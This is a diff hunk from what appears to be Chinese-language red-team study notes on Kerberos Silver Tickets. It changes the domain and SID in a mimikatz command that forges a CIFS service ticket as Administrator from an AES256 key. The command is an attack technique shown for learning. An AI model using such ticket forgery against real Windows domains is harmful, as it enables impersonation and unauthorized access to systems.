@@ -190,7 +190,7 @@ Silver Ticket 是伪造的 TGS
 
 制作银票
 ```
-mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
+mimikatz # kerberos::golden /user:Administrator /domain:rto.local /sid:S-1-5-21-2323903455-1895497758-3703895482 /target:srv-2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
 ```
 
 参数解释
